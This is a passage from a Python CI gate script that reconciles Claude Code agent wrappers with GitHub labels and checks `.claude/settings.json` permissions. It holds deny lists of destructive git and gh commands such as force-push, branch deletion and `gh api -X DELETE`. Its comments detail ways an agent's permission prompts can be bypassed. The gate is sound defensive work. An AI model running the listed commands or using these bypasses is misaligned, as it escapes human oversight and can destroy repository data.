#!/usr/bin/env python3
"""Roster ↔ label-taxonomy reconciliation gate for DeltaSharp (STORY-00.6.2, #452).

PR #449 established `docs/planning/label-taxonomy.md` with a *manual* reconciliation
of the persona roster, the `persona:<slug>` GitHub labels, `CODEOWNERS`, and the
feature-request milestone dropdown. This script turns that manual snapshot into a
lightweight, re-runnable gate so the three reconciliations below — plus a validation of the
`.claude/settings.json` permission surface — fail CI instead of silently rotting:

  1. **Roster ↔ persona labels.** Every `.claude/agents/*.md` wrapper (a markdown file
     whose front matter carries a `name:`; fence-less markdown there is ignored) must have a
     matching `persona:<slug>` label and vice-versa. The roster is NON-RECURSIVE — only
     wrappers directly in `.claude/agents/` are roster entries; a `name:`-bearing file
     nested in a subdirectory is an INTEGRITY ERROR (the workflow path filter would still
     ship it), not a silently ignored file. Each wrapper's front matter is also held to a
     POLICY: `permissionMode` may only be `default` or `plan` (`bypassPermissions` and the
     other prompt-skipping modes auto-run commands the settings allow/deny lists never see),
     no `hooks`/`mcpServers`/`isolation`/`env` key may appear (`isolation: worktree` runs
     `git worktree add` with no prompt), and any other unknown key is rejected —
     a wrapper is a persona brief, not an execution-configuration surface. The front matter
     is read by a STRICT, fail-closed subset reader (:func:`_read_frontmatter`), not a
     tolerant line regex: a quoted key, a space before the colon, a flow mapping, a wholly
     indented mapping or a duplicate key is reported as an integrity problem instead of
     being skipped, because a real YAML parser reads the dangerous key out of every one of
     those spellings. Likewise a file that opens a `---` fence but declares no `name:` is a
     persona CANDIDATE and fails rather than being dismissed as ordinary markdown. The GitHub
     50-character label cap forces
     exactly one documented truncation (the trailing `-engineer` is dropped from
     `persona:dotnet-vectorized-columnar-compute-engineer`); that truncation is allowed ONLY
     when `label-taxonomy.md` records it. The roster is reconciled against BOTH the persona
     labels *documented* in `label-taxonomy.md` (a committed list, checked even `--offline`,
     so a removed/added agent is caught with no network) and the LIVE GitHub labels (which
     additionally catches drift introduced in the GitHub UI). Any other difference FAILS.
  2. **CODEOWNERS parse errors.** `GET /repos/{repo}/codeowners/errors` must report an empty
     `errors` array — a syntax or unknown-owner error FAILS. The check is pinned to a `ref`
     (the PR head/merge SHA in CI, else the default branch) so a PR that breaks CODEOWNERS
     fails the PR gate rather than slipping through to be caught only post-merge.
  3. **Milestone dropdown ↔ live milestones.** The `id: milestone` dropdown in
     `.github/ISSUE_TEMPLATE/feature_request.yml` must offer exactly the live GitHub
     milestones, plus the documented "needs triage" sentinel. A stale/renamed option or a
     live milestone missing from the dropdown FAILS.

Alongside those three reconciliations the gate runs one local VALIDATION,
`settings-permissions` (:func:`validate_settings`): `.claude/settings.json` must parse and its
`permissions.allow` / `permissions.deny` must be LISTS OF STRINGS. It then rejects, precisely:
the enumerated mutating git/gh prefixes in :data:`FORBIDDEN_ALLOW_COMMANDS` (`gh api`,
`git push`, `gh pr merge`, ... — including via a broad `Bash(gh:*)`/`Bash(git:*)`, and
CASE-INSENSITIVELY, because on a case-insensitive filesystem `Bash(GH api:*)` still resolves
to the real `gh`); any WILDCARD or TOOL-WIDE Bash grant (`Bash`, `Bash()`, `Bash(*)`,
`Bash(:*)`, and any command still holding a `*` once the trailing `:*` argument wildcard is
stripped — Claude Code reads such a `*` as a GLOB, so `Bash(gh *)` matches `^gh.*$` and
auto-runs `gh api`); and any `permissions.defaultMode` other than `default`/`plan`
(`bypassPermissions` and `dontAsk` skip every prompt; `acceptEdits` auto-approves file writes).
The KEY SURFACE is an allowlist rather than a blocklist: only `permissions` plus the inert
knobs `$schema`, `model`, `cleanupPeriodDays`, `includeCoAuthoredBy`, `attribution`,
`outputStyle`, `language`, `spinnerTipsEnabled` may appear at top level, and `permissions`
may hold only `allow`/`deny`/`defaultMode` (`additionalDirectories` gets its own message).
Every executable-valued key — `hooks`, `env`, `apiKeyHelper`, `statusLine`, ... — is thus
rejected, and so is any key a future Claude Code release adds that this gate has never heard
of. It also REQUIRES all 14 :data:`REQUIRED_DENY_ENTRIES`.
Allow entries outside those rules are NOT policed — the check bounds the blast radius of this
file, it does not certify the whole permission surface. It is a policy check on a
security-relevant file rather than a reconciliation between two sources, but it shares the
gate's report/exit contract. Run it alone with `--validate-settings-only`.

Design constraints
------------------
* **Stdlib only.** No PyYAML / no third-party imports, so the gate is deterministic and
  installs nothing. The milestone dropdown is parsed with a small, targeted reader for the
  GitHub issue-form structure (see `parse_milestone_options`).
* **Degrades gracefully off-network.** The roster read, the dropdown parse, and the roster ↔
  *documented*-labels reconciliation are local (filesystem) and always run. The LIVE
  GitHub-API lookups (labels, milestones, codeowners/errors) shell out to `gh`; if `gh` is
  missing or unauthenticated they are SKIPPED with a warning so local dev works without a
  token. Pass `--require-remote` (CI does) to turn a remote check that could not RUN into a
  hard **exit 2** (a gh/API outage, distinct from drift — never miscounted as exit-1 drift),
  and `--offline` to skip every live remote check (the documented-labels check still runs).

Usage
-----
    # Full gate (CI): all remote checks must run and pass.
    python3 tools/reconcile/roster-labels.py --repo khaines/deltasharp --require-remote

    # Local dev: remote checks run if `gh` is authenticated, otherwise skip.
    python3 tools/reconcile/roster-labels.py

    # Prove the gate's own reconciliation logic with in-memory fixtures (no network):
    python3 tools/reconcile/roster-labels.py --selftest

    # Validate ONLY the .claude/settings.json permission surface (local, fail-fast CI step):
    python3 tools/reconcile/roster-labels.py --validate-settings-only

Exit codes: 0 = reconciled (no drift), 1 = drift detected (a check FAILED), 2 = usage/data
error, OR a required remote check could not run (`--require-remote` with `gh`/the GitHub API
unavailable) — a remote outage, reported distinctly from drift so an outage never reads as
roster drift. The split is by WHO ACTS, not by where the error was raised: roster INTEGRITY
problems (nested / unparseable / nameless wrappers) exit 1 even when they leave the roster
empty, because the author fixes them in the repo; only a MISSING or genuinely empty agents
directory — nothing to verify against — exits 2 alongside the remote-outage case.
"""

from __future__ import annotations

import argparse
import contextlib
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import urllib.parse

# --- Constants ---------------------------------------------------------------------------

PERSONA_PREFIX = "persona:"
# GitHub caps label names at 50 characters; a persona label longer than this must be
# truncated (and the truncation documented in label-taxonomy.md).
GITHUB_LABEL_MAX = 50
# The project's documented truncation strategy drops this redundant trailing token.
TRUNCATION_SUFFIX = "-engineer"
DEFAULT_REPO = "khaines/deltasharp"
# Dropdown options that are intentionally NOT backed by a live GitHub milestone.
SENTINEL_MILESTONE_OPTIONS = frozenset({"Unsure / needs triage"})

DEFAULT_AGENTS_DIR = os.path.join(".claude", "agents")
DEFAULT_SETTINGS = os.path.join(".claude", "settings.json")
DEFAULT_FEATURE_FORM = os.path.join(".github", "ISSUE_TEMPLATE", "feature_request.yml")
DEFAULT_TAXONOMY = os.path.join("docs", "planning", "label-taxonomy.md")

# label-taxonomy.md carries a delimited, machine-readable list of the persona labels so the
# gate has a COMMITTED source of truth for them. This lets `--offline` reconcile the roster
# against the labels the project *documents* (catching a removed/added agent) without the
# live GitHub label set; remote mode additionally diffs the roster against the LIVE labels.
PERSONA_LABELS_BEGIN = "<!-- BEGIN persona-labels"
PERSONA_LABELS_END = "<!-- END persona-labels"

# --- .claude/settings.json permission policy ---------------------------------------------
# Commands that must NEVER be auto-allowed (they mutate the repo, GitHub state, or the local
# worktree layout, so they have to prompt). An allow entry is rejected when its command is a
# TOKEN-PREFIX of one of these (`gh` covers `gh api`; `git` covers `git push`) or when one of
# these is a token-prefix of it (`gh api repos/x` IS a `gh api` call).
#
# This table is only the ENUMERATED half of the allow policy. Independently of it, the allow
# loop rejects every grant that is not a single literal command: a TOOL-WIDE `Bash` / `Bash()`
# entry (Claude Code reads a bare tool name as "allow every Bash command"), a blanket
# `Bash(*)` / `Bash(:*)`, and any entry whose command still contains a `*` after the trailing
# `:*` argument wildcard is stripped — Claude Code expands such a `*` as a GLOB, so
# `Bash(gh *)`, `Bash(gh api*)` and `Bash(git *)` compile to `^gh.*$` / `^git.*$` and auto-run
# `gh api` / `git push` with no prompt. The comparison is CASE-INSENSITIVE (`_bash_command`
# lowercases): on macOS/Windows the filesystem is case-insensitive, so `Bash(GH api:*)`
# resolves to the real `gh` and Claude Code honours the rule. Allow entries that are neither
# listed here nor wildcard/tool-wide grants are NOT policed.
FORBIDDEN_ALLOW_COMMANDS = (
    "gh api",
    "git push",
    "git fetch",
    "gh pr merge",
    "gh release",
    "gh secret",
    "git worktree add",
    "git worktree remove",
)
# Deny entries that must be present verbatim. The deny list is the belt to the allow list's
# braces: an entry deleted here silently re-opens a mutating command to a future broad allow
# rule or an interactive "yes". Claude Code's matcher is word-boundary aware
# (`startsWith(prefix + " ")`), so `Bash(git push --force:*)` denies `git push --force ...`
# WITHOUT catching `git push --force-with-lease`.
REQUIRED_DENY_ENTRIES = (
    "Bash(git branch -D:*)",
    "Bash(git branch -d:*)",
    "Bash(git branch -M:*)",
    "Bash(git branch -m:*)",
    "Bash(git push -f:*)",
    "Bash(git push --force:*)",
    "Bash(gh api -X POST:*)",
    "Bash(gh api -X PUT:*)",
    "Bash(gh api -X PATCH:*)",
    "Bash(gh api -X DELETE:*)",
    "Bash(gh api --method:*)",
    "Bash(gh pr merge:*)",
    "Bash(gh release:*)",
    "Bash(gh secret:*)",
)
# `permissions.defaultMode` values that switch the prompt OFF wholesale. They make every
# allow/deny refinement above moot (both were proven to auto-run commands), so neither may
# appear in the tracked project settings.
FORBIDDEN_DEFAULT_MODES = ("bypassPermissions", "dontAsk")
# ...and, like the key surface, `defaultMode` is policed by an ALLOWLIST rather than only that
# blocklist: `acceptEdits` still auto-approves every file write with no prompt, which in a
# TRACKED settings file means another author's branch can edit the worktree unattended, so
# only the two fully prompting modes may appear (absent is fine — the session default applies).
ALLOWED_DEFAULT_MODES = ("default", "plan")

# The tracked project settings are policed by an ALLOWLIST, not a blocklist. Claude Code keeps
# adding settings keys whose value is a COMMAND STRING that runs with no permission prompt
# (`hooks`, `env`, `apiKeyHelper`, `statusLine`, ...); enumerating them was proven incomplete
# (R5-F1), so anything not named here is rejected on sight and belongs in settings.local.json.
# Only inert, non-executable knobs are listed.
ALLOWED_TOP_LEVEL_KEYS = (
    "$schema",
    "permissions",
    "model",
    "cleanupPeriodDays",
    "includeCoAuthoredBy",
    "attribution",
    "outputStyle",
    "language",
    "spinnerTipsEnabled",
)
# Likewise inside `permissions`: only the three keys this gate actually validates may appear,
# so a future permission knob cannot widen the surface behind the validator's back.
ALLOWED_PERMISSION_KEYS = ("allow", "deny", "defaultMode")
# Top-level keys whose value is (or contains) a COMMAND LINE that Claude Code executes with no
# permission prompt. They are all rejected by the allowlist above; this table only exists so
# the rejection carries the specific "this runs a command" message instead of the generic one.
# `apiKeyHelper` is the sharpest: it runs at CLI STARTUP, before any tool call is made.
HELPER_COMMAND_KEYS = (
    "apiKeyHelper",
    "awsAuthRefresh",
    "awsCredentialExport",
    "gcpAuthRefresh",
    "otelHeadersHelper",
    "processWrapper",
    "policyHelpers",
    "proxyAuthHelper",
    "statusLine",
    "subagentStatusLine",
    "fileSuggestion",
)

# --- .claude/agents/*.md front-matter policy ---------------------------------------------
# A persona wrapper is a BRIEF, not an execution-configuration surface. Claude Code reads
# several wrapper front-matter keys as runtime configuration, and `permissionMode` is the
# sharpest: `bypassPermissions` (also `acceptEdits`, `dontAsk`, `auto`) makes every tool call
# in that subagent run with NO permission prompt, so a tracked wrapper can auto-run a command
# the `.claude/settings.json` allow/deny policy above would never have granted. The roster
# gate previously read only `name:`, so such a wrapper shipped unseen (FINAL-F1). Only the
# prompting modes may appear in a tracked wrapper; ABSENT is fine (it inherits the session).
ALLOWED_AGENT_PERMISSION_MODES = ("default", "plan")
# Front-matter keys that carry executable commands, connect external servers/environment, or
# provision worktrees. They are rejected by name (they are absent from the allowlist below
# too, but the specific message says WHY) — put them in untracked local configuration if a
# particular worktree genuinely needs them. `isolation: worktree` belongs here because it was
# proven to run `git worktree add` with NO permission prompt — the very command the settings
# allow policy (:data:`FORBIDDEN_ALLOW_COMMANDS`) refuses to auto-allow.
FORBIDDEN_AGENT_KEYS = ("hooks", "mcpServers", "isolation", "env")
# Why each forbidden key is rejected, appended to its message so the report is actionable.
FORBIDDEN_AGENT_KEY_REASONS = {
    "hooks": "it runs arbitrary commands on tool events with no permission prompt",
    "mcpServers": "it launches/connects an external MCP server outside the permission gate",
    "isolation": "it provisions a worktree, running `git worktree add` with no permission "
                 "prompt — a command the settings allow policy refuses to auto-allow",
    "env": "it overrides the environment of every auto-allowed command (PATH, GIT_*, ...)",
}
# Same allowlist discipline as the settings check: a wrapper may carry only these inert,
# brief-shaped keys (each probed against the CLI as non-executing), so a future Claude Code
# release that adds a command-valued wrapper key cannot widen the surface behind this gate's
# back. `isolation`/`hooks`/`mcpServers`/`env` are deliberately NOT here.
#
# The list is deliberately MINIMAL: the four keys the 25 tracked wrappers actually use, plus
# the two NARROWING knobs (`disallowedTools` removes tools, `permissionMode` is separately
# constrained to the prompting modes). Cosmetic or speculative keys are NOT pre-admitted —
# an allowlist entry nobody needs is surface this gate can never take back, and the rejection
# message already names the key to add here when a wrapper genuinely needs one.
ALLOWED_AGENT_KEYS = (
    "name",
    "description",
    "tools",
    "disallowedTools",
    "model",
    "permissionMode",
)


# --- Output helpers ----------------------------------------------------------------------

def _log(msg: str = "") -> None:
    print(msg, flush=True)


def _error(msg: str) -> None:
    # GitHub Actions annotation; renders inline on the PR.
    print(f"::error::{msg}", flush=True)


def _warning(msg: str) -> None:
    print(f"::warning::{msg}", flush=True)


# --- Repo resolution ---------------------------------------------------------------------

def resolve_repo(explicit: "str | None", offline: bool = False) -> str:
    """Resolve OWNER/REPO from --repo, the Actions env, `gh`, or the default.

    Under ``--offline`` we must not shell out to `gh` at all (that would break the
    "skip all GitHub-API checks" contract), so resolution stops at the environment /
    ``DEFAULT_REPO`` and never invokes the CLI.
    """
    if explicit:
        return explicit
    env = os.environ.get("GITHUB_REPOSITORY")
    if env:
        return env
    if offline:
        return DEFAULT_REPO
    ok, out, _ = _gh(["repo", "view", "--json", "nameWithOwner", "--jq", ".nameWithOwner"])
    if ok and out.strip():
        return out.strip()
    return DEFAULT_REPO


def resolve_ref(explicit: "str | None") -> "str | None":
    """Resolve the git ref whose CODEOWNERS should be validated.

    Prefer an explicit ``--ref``, then ``$GITHUB_SHA`` (in GitHub Actions this is the
    checked-out commit — the PR *merge* commit for ``pull_request`` events, i.e. the
    PR-head-merged state). Returns ``None`` to let the API validate the repository's
    DEFAULT branch, the correct fallback for local runs.
    """
    if explicit:
        return explicit.strip() or None
    env_sha = os.environ.get("GITHUB_SHA")
    if env_sha and env_sha.strip():
        return env_sha.strip()
    return None


# --- Local roster reader -----------------------------------------------------------------

class FrontmatterError(Exception):
    """A front-matter block this gate refuses to interpret (it must FAIL, never be ignored).

    The reader below is a strict, stdlib-only subset of YAML, not a YAML parser. Anything
    outside that subset — a quoted key, `key :`, a flow mapping, a wholly indented mapping —
    is a spelling a REAL YAML parser (i.e. Claude Code) reads as configuration while this
    reader would not. Silently ignoring such a line is precisely the bypass VERIFY-F1
    demonstrated, so the reader raises and :func:`read_roster` turns the raise into an
    integrity problem: the unparseable wrapper reddens the gate instead of sliding through.

    The message is the sentence tail appended after ``agent wrapper '<path>' ``.
    """


# The ONLY top-level form the strict reader accepts: an unquoted, plain key at column 0,
# immediately followed by `:` and then whitespace or end-of-line. `key :` (space before the
# colon), `"key":` and `key:value` are all deliberately OUTSIDE this grammar — each is read
# differently (or identically, in the quoted case) by a real YAML parser, so each is reported
# as unparseable rather than skipped.
_FRONTMATTER_KEY_LINE = re.compile(r"^([A-Za-z_][A-Za-z0-9_-]*):(\s|$)")


def _is_fence(line: str) -> bool:
    """True only for an UNINDENTED `---` fence line.

    The indentation matters: inside a block scalar (`description: |`) an INDENTED `  ---` is
    ordinary text, not the end of the front matter. Terminating on `line.strip() == "---"`
    therefore stopped the reader early and left every key after it — including a
    `permissionMode: bypassPermissions` at column 0 — completely unread (0 problems).
    """
    return line.rstrip() == "---" and not line[:1].isspace()


def _read_frontmatter(path: str) -> "tuple[dict[str, str] | None, list[str]]":
    """Return (top-level `key: value` pairs, duplicate keys) for a YAML front-matter block.

    Returns ``(None, [])`` when the file has NO front-matter fence at all (plain markdown —
    a README, a template): such a file is not a persona candidate. A file that DOES open a
    `---` fence is a persona candidate and is read STRICTLY.

    Stdlib-only and deliberately shallow (no PyYAML), but FAIL-CLOSED rather than lenient:
    every line between the fences must be one of

    * blank;
    * a `#` comment;
    * an INDENTED continuation (a block scalar's text, a nested mapping/sequence under a
      recognised top-level key) — allowed only AFTER a top-level key has been seen, so a
      mapping that is indented in its entirety cannot hide its keys from this reader. An
      indented `  ---` is such a continuation, NOT the closing fence (see :func:`_is_fence`);
    * a top-level key matching :data:`_FRONTMATTER_KEY_LINE` (`key: value` / `key:`).

    Any other non-blank line — a quoted key (`"permissionMode": bypassPermissions`), a space
    or tab before the colon (`permissionMode : bypassPermissions`), a flow mapping
    (`{name: x, permissionMode: y}`), a column-0 `-` list item, a stray document marker, or a
    missing closing fence — raises :class:`FrontmatterError`. Every one of those spellings
    was proven to yield ZERO problems from the old column-0 line regex while a real YAML
    parser reads the dangerous key (VERIFY-F1).

    DUPLICATE top-level keys are returned separately rather than silently resolved: this
    reader is first-wins and YAML is last-wins, so `permissionMode: default` followed by
    `permissionMode: bypassPermissions` would validate clean here and run unprompted there.
    The dict keeps the FIRST value (so a wrapper still has a `name:` to report against) and
    the duplicate is raised as its own integrity problem, which fails the gate regardless of
    which value either implementation would have picked.

    Values are returned as written (surrounding quotes stripped); a nested block's value is
    the empty string, which is enough for the policy in :func:`validate_agent_frontmatter` —
    that policy cares about which keys are PRESENT plus the scalar `permissionMode`.
    """
    try:
        with open(path, "r", encoding="utf-8") as handle:
            lines = handle.read().splitlines()
    except (OSError, UnicodeDecodeError) as exc:
        # An unreadable file in the agents directory must not read as "no front matter":
        # the workflow path filter would still ship it. Fail closed.
        #
        # UnicodeDecodeError is caught alongside OSError deliberately: a wrapper saved in
        # UTF-16/Latin-1 (or any file whose bytes are not UTF-8) otherwise unwound all the
        # way out of read_roster as an unhandled exception — the gate died with a traceback
        # that never named the offending file, which is a worse operator experience than the
        # drift it was meant to report. Here it becomes one named integrity problem.
        raise FrontmatterError(
            f"cannot be read ({exc.__class__.__name__}: {exc}), so its front matter cannot "
            f"be parsed strictly"
        ) from exc
    # A UTF-8 BOM ahead of the fence must not make the file read as plain markdown: editors
    # write one silently, and Claude Code still parses the front matter behind it.
    if lines:
        lines[0] = lines[0].lstrip("\ufeff")
    if not lines or not _is_fence(lines[0]):
        return (None, [])

    closing = None
    for index in range(1, len(lines)):
        if _is_fence(lines[index]):
            closing = index
            break
    if closing is None:
        raise FrontmatterError(
            "has front matter the gate cannot parse strictly (the opening `---` fence is "
            "never closed); add the closing `---` fence"
        )

    frontmatter: "dict[str, str]" = {}
    duplicates: "list[str]" = []
    for offset, line in enumerate(lines[1:closing], start=2):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue  # blank line or comment
        match = _FRONTMATTER_KEY_LINE.match(line)
        if match is None:
            if line[:1] in (" ", "\t") and frontmatter:
                continue  # indented continuation under a recognised top-level key
            hint = ""
            if line.startswith("- "):
                # A column-0 `- item` is a block sequence written flush against its key
                # (`tools:\n- Read`). Real YAML reads the list; this reader cannot, so it
                # must still reject — but a rule with no remedy just strands the operator,
                # and the fix (indent the items) is one keystroke.
                hint = " (indent block-sequence items under their key)"
            raise FrontmatterError(
                f"has front matter the gate cannot parse strictly (line {offset}: "
                f"{stripped!r}); use plain `key: value` lines at column 0{hint}"
            )
        key = match.group(1)
        value = line[len(key) + 1 :].strip()
        if len(value) >= 2 and value[0] in "\"'" and value[-1] == value[0]:
            value = value[1:-1]  # quoted: the quotes delimit the value, `#` included
        else:
            # An UNQUOTED scalar ends at a ` #`: YAML reads the rest of the line as a
            # comment, so `permissionMode: default  # normal` is the mode `default`. Keeping
            # the comment made the gate reject a wrapper that is legal, safe and correct —
            # a false positive on the permission-mode allowlist, which is exactly the kind
            # of "the gate is wrong again" signal that trains people to route around it.
            # A value that is ONLY a comment (`model:  # tbd`) becomes the empty string,
            # which is what YAML reads there too.
            comment = re.search(r"(^|\s)#", value)
            if comment is not None:
                value = value[: comment.start()].rstrip()
        if key in frontmatter:
            if key not in duplicates:
                duplicates.append(key)
            continue  # first-wins here; the duplicate is reported instead of resolved
        frontmatter[key] = value
    return (frontmatter, duplicates)


def validate_agent_frontmatter(path: str, frontmatter: "dict[str, str]") -> "list[str]":
    """Return policy problems with one wrapper's front matter (empty ⇒ clean).

    A tracked persona wrapper is a BRIEF. Claude Code, however, reads parts of the wrapper
    front matter as RUNTIME CONFIGURATION, so an innocuous-looking `.claude/agents/*.md` edit
    can switch the permission prompt off for that subagent or attach an MCP server / hook —
    none of which the `.claude/settings.json` policy in :func:`validate_settings` can see.
    Three rules, checked in this order so the specific message wins over the generic one:

    * `permissionMode` must be absent or one of :data:`ALLOWED_AGENT_PERMISSION_MODES`
      (`default`, `plan`). `bypassPermissions`/`acceptEdits`/`dontAsk`/`auto` all skip the
      prompt, which was proven to auto-run a forbidden command with no prompt (FINAL-F1);
    * no key in :data:`FORBIDDEN_AGENT_KEYS` (`hooks`, `mcpServers`, `isolation`, `env`) —
      those are executable/config-bearing; `isolation: worktree` in particular runs
      `git worktree add` with no permission prompt;
    * every remaining key must be in :data:`ALLOWED_AGENT_KEYS` (`name`, `description`,
      `tools`, `disallowedTools`, `model`, `permissionMode`); an unknown key is rejected on
      sight, because a key this gate has never heard of may execute something. The list is
      intentionally minimal — a cosmetic key that no wrapper uses is surface admitted for
      nothing, and the rejection message names the key to add here if one is ever needed.

    Reported as roster INTEGRITY problems (they redden `roster<->documented-labels`, like a
    nested wrapper does), so the gate fails on the branch that introduces the wrapper.
    """
    problems: "list[str]" = []
    mode = frontmatter.get("permissionMode")
    if mode is not None and mode not in ALLOWED_AGENT_PERMISSION_MODES:
        problems.append(
            f"agent wrapper {path!r} sets permissionMode {mode!r}; tracked persona wrappers "
            f"may only use default or plan "
            f"(bypassPermissions/acceptEdits/dontAsk/auto skip prompts)"
        )
    for key in frontmatter:
        if key in FORBIDDEN_AGENT_KEYS:
            reason = FORBIDDEN_AGENT_KEY_REASONS.get(key)
            because = f" ({reason})" if reason else ""
            problems.append(
                f"agent wrapper {path!r} defines {key!r}, which is executable/config-bearing"
                f"{because}; tracked persona wrappers may carry only "
                f"{', '.join(repr(k) for k in ALLOWED_AGENT_KEYS)}"
            )
        elif key not in ALLOWED_AGENT_KEYS:
            problems.append(
                f"agent wrapper {path!r} carries unknown front-matter key {key!r}; tracked "
                f"persona wrappers may carry only "
                f"{', '.join(repr(k) for k in ALLOWED_AGENT_KEYS)} — a key this gate does not "
                f"understand may configure execution with no permission prompt"
            )
    return problems


# Clauses :func:`read_roster` appends to its "no persona wrappers found" FileNotFoundError
# when that emptiness is explained by integrity problems (nested wrappers, or unparseable /
# nameless ones) rather than by an absent directory. :func:`main` keys the EXIT CODE off
# them: integrity problems are DRIFT (exit 1, "fix the repo"), while a genuinely empty or
# missing agents directory is a data error the gate cannot run against (exit 2, which the
# workflow documents as "could not verify" and an operator reads as an outage). Conflating
# the two sends a responder hunting a GitHub outage that never happened.
INTEGRITY_CLAUSE_MARKERS = ("other integrity problem(s)", "found and ignored")


def read_roster(agents_dir: str) -> "tuple[set[str], list[str], int]":
    """Return (persona slugs, integrity problems, wrappers policed) from `.claude/agents/*.md`.

    "Is a persona wrapper" is a property of the FILE, not of its name: only a
    `.claude/agents/*.md` file whose front matter carries a `name:` is a roster entry. Plain
    markdown that lives alongside the wrappers (a README, a template) is ignored rather than
    being mistaken for a persona slug — there is no fall-back to the filename stem, so a
    stray README.md cannot red the gate. "Plain markdown" means NO `---` front-matter fence
    at all: a file that OPENS a fence is a persona candidate, so a fence with no `name:` is
    an integrity problem rather than a silent skip. That is the fail-closed half of the
    strict reader — every spelling the reader cannot interpret used to land in the "ignored,
    not a persona" bucket, which is exactly how a `permissionMode: bypassPermissions` written
    as `"permissionMode":` slipped past the policy (VERIFY-F1).

    The third return value is how many TOP-LEVEL wrappers had the front-matter policy in
    :func:`validate_agent_frontmatter` applied to them, so the passing report can attest that
    the policy actually ran over the roster instead of silently covering zero files.

    The slug is the front-matter `name:` (canonical); the filename stem must match it, and a
    mismatch is reported as an integrity problem so a mislabeled wrapper cannot hide.

    Each top-level wrapper's front matter is additionally held to the policy in
    :func:`validate_agent_frontmatter` (no prompt-skipping `permissionMode`, no
    `hooks`/`mcpServers`/`env`, no unknown keys); violations are returned as integrity
    problems alongside the naming ones. A NESTED wrapper is policed too — both classes of
    problem report on the same run, so fixing the nesting does not reveal a second failure.

    The roster itself is NON-RECURSIVE — only files sitting directly in ``agents_dir`` count.
    The scan, however, IS recursive, because the workflow path filter (`.claude/agents/**`)
    is: a `name:`-bearing wrapper hidden in a subdirectory would otherwise be silently
    ignored by this gate while still shipping as an agent. Such a NESTED WRAPPER IS AN
    INTEGRITY ERROR, reported here rather than passed over.

    The walk uses :func:`os.walk` rather than a recursive ``glob``: ``glob`` skips
    DOT-PREFIXED directories, so a wrapper parked in `.claude/agents/.hidden/` would be
    invisible to this gate while `.claude/agents/**` still shipped it. Symlinked directories
    are not followed (``followlinks=False``) so a link loop cannot hang the gate.

    When the scan finds NO top-level wrapper, the raised ``FileNotFoundError`` carries any
    integrity problems collected on the way (e.g. "1 nested wrapper was found and ignored:
    <path>"), so an agents directory whose wrappers all sit one level down is diagnosed
    precisely instead of reading as an empty directory.
    """
    all_paths: "list[str]" = []
    for dirpath, dirnames, filenames in os.walk(agents_dir, followlinks=False):
        dirnames.sort()  # deterministic traversal order
        for filename in filenames:
            if filename.endswith(".md"):
                all_paths.append(os.path.join(dirpath, filename))
    all_paths.sort()
    slugs: "set[str]" = set()
    problems: "list[str]" = []
    nested: "list[str]" = []
    policed = 0
    first_seen: "dict[str, str]" = {}
    for path in all_paths:
        try:
            frontmatter, duplicate_keys = _read_frontmatter(path)
        except FrontmatterError as exc:
            # Fail CLOSED: a front-matter block this gate cannot read strictly is reported,
            # never skipped. A real YAML parser (Claude Code) may well read a dangerous key
            # out of it, so "unparseable" must cost the same as "policy violation".
            problems.append(f"agent wrapper {path!r} {exc}")
            continue
        if frontmatter is None:
            continue  # plain markdown, no front-matter fence — not a persona wrapper
        for key in duplicate_keys:
            problems.append(
                f"agent wrapper {path!r} declares duplicate front-matter key {key!r}; YAML "
                f"keeps the LAST value while this gate reads the first, so the policy would "
                f"validate a value the CLI never uses — keep exactly one {key!r} line"
            )
        relative = os.path.relpath(path, agents_dir)
        if os.sep in relative or (os.altsep and os.altsep in relative):
            # A wrapper below the top level is NOT a roster entry (the roster is flat) but
            # must not vanish silently — the workflow's path filter would still ship it.
            # The policy still runs on it (both classes of problem report at once) while the
            # nesting problem is tracked separately, because only NESTING explains an
            # otherwise-empty agents directory in the FileNotFoundError below.
            if frontmatter.get("name"):
                nested.append(
                    f"persona wrapper {path!r} is nested; wrappers must sit directly in "
                    f"{agents_dir}"
                )
                problems.append(nested[-1])
            problems.extend(validate_agent_frontmatter(path, frontmatter))
            continue
        policed += 1
        problems.extend(validate_agent_frontmatter(path, frontmatter))
        name = frontmatter.get("name") or None
        if not name:
            # A fenced file IS a persona candidate; without a `name:` it can neither be
            # reconciled against a label nor be dismissed as plain markdown. Any forbidden
            # key it carries has already been named by the policy call above.
            problems.append(
                f"agent wrapper {path!r} opens a `---` front-matter fence but declares no "
                f"`name:` — a fenced file in {agents_dir} is a persona wrapper candidate and "
                f"cannot be reconciled against a persona label; add the `name:` (matching the "
                f"filename stem) or remove the front-matter fence"
            )
            continue
        stem = os.path.basename(path)[: -len(".md")]
        if name != stem:
            problems.append(
                f"agent wrapper {path!r} front-matter name {name!r} does not match its "
                f"filename stem {stem!r} — rename one so the persona slug is unambiguous"
            )
        if name in slugs:
            problems.append(
                f"duplicate persona slug {name!r} — declared by both "
                f"{first_seen[name]!r} and {path!r}"
            )
        else:
            first_seen[name] = path
        slugs.add(name)
    if not slugs:
        message = (
            f"no persona wrappers found directly under {agents_dir!r} "
            f"(expected {agents_dir!r}/*.md with a front-matter `name:`)"
        )
        if nested:
            # Only NESTING explains "the directory looks empty" — naming those wrappers turns
            # it into "your wrappers are one level too deep", which is the actual fix. Other
            # problems (unparseable/policy) are not nesting and must not be described as such.
            was = "wrapper was" if len(nested) == 1 else "wrappers were"
            message += (
                f"; {len(nested)} nested {was} found and ignored: "
                + "; ".join(nested)
            )
        other = [problem for problem in problems if problem not in nested]
        if other:
            # Unparseable/policy problems are not nesting, so they get their own clause
            # rather than being mislabelled — but they must still be REPORTED here, or a
            # directory holding only an unreadable wrapper would raise a bare "empty".
            message += (
                f"; {len(other)} other integrity problem(s): " + "; ".join(other)
            )
        raise FileNotFoundError(message)
    return slugs, problems, policed


# --- Truncation logic --------------------------------------------------------------------

def derive_truncated_label(slug: str) -> "str | None":
    """The documented truncation for an over-long persona label drops trailing `-engineer`.

    Returns ``None`` when the slug doesn't carry the redundant suffix, OR when even the
    truncated label would still exceed GitHub's 50-character cap — a future, longer slug
    could be "documented" yet remain unstorable as a label, so we refuse to derive a
    truncation that itself doesn't fit rather than pretend it does.
    """
    if not slug.endswith(TRUNCATION_SUFFIX):
        return None
    truncated = slug[: -len(TRUNCATION_SUFFIX)]
    if len(PERSONA_PREFIX + truncated) > GITHUB_LABEL_MAX:
        return None
    return truncated


def truncation_documented(taxonomy_text: str, slug: str, trunc: str) -> bool:
    """True only when label-taxonomy.md records BOTH the full slug and the standalone label.

    The truncated label must appear as its own token — not merely as the prefix of the full
    slug — so a stray substring can't be mistaken for documentation.
    """
    if not taxonomy_text:
        return False
    full_label = PERSONA_PREFIX + slug
